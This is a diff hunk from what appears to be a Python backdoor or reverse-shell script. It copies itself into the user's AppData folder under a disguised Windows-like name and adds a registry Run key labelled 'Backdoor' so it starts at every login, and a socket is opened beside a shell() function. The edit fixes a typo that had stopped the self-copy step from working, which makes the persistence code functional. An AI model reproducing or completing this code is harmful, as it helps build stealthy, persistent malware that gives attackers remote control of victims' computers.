@@ -58,7 +58,7 @@ def shell():
 
 location = os.environ["appdata"] + "\\Avinashwindows32.exe"
 if not os.path.exists(location):
-	shutil.copyfile(sys.exeutable, location)
+	shutil.copyfile(sys.executable, location)
 	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + "'", shell=True)
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
